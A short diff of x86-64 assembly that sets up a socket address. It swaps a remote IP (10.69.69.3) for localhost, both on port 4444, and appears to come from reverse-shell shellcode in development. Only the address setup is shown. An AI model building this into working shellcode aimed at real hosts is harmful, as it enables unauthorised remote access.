@@ -20,7 +20,10 @@ start:
 	mov r12, rax ; Save the socket
 
 ;Sock_addr
-	mov r13, 0x0345450A5C110002
+	;		10.69.69.3 4444 
+	;mov r13, 0x0345450A5C110002
+	;		127.0.0.1 4444
+	mov r13, 0x0100007F5C110002
 	push r13
 	mov r13, rsp
 
